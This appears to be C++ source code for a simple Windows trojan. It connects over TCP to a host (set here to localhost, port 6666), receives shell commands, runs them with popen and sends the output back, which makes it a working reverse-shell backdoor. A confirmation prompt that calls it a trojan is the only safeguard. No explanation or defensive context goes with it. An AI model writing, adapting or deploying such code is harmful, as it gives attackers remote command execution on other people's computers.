#pragma comment(lib, "Ws2_32.lib")

#include <WinSock2.h>
#include <iostream>
#include <string>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

using namespace std;


#define        PORT_NUM        (6666)

string executeCommand(const char* cmd) {
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int main()
{
    string confirm;
    char message[200];

    //Winsock-DLL
    int r;
    WSAData wsaData;
    WORD DLLVersion;
    DLLVersion = MAKEWORD(2,1);
    r = WSAStartup(DLLVersion, &wsaData);

    // Create addr
    SOCKADDR_IN addr;
    int addlen = sizeof(addr);

    // Create socket
    SOCKET sConnect;
    sConnect = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT_NUM);

    cout << "[WARNING] This is a trojan. Do u really want to start? [Y] or [N]" << endl;
    cin >> confirm;

    if(confirm == "N")
    {
        exit(1);
    }else{
        if(confirm == "Y")
        {
            connect(sConnect, (SOCKADDR*)&addr, sizeof(addr));
			while(1)
			{
				ZeroMemory(message, 200);
	            r = recv(sConnect, message, sizeof(message), 0);
	            cout << message << endl;
	            string str = executeCommand(message);
	            char *sendbuf = &str[0];
	            send(sConnect,sendbuf,(int)strlen(sendbuf),0);
	            char *done = "Command executed.\n";
	            send(sConnect,done,(int)strlen(done),0);
			}
            closesocket(sConnect);

            getchar();
        }
    }
	return 0;
}

 
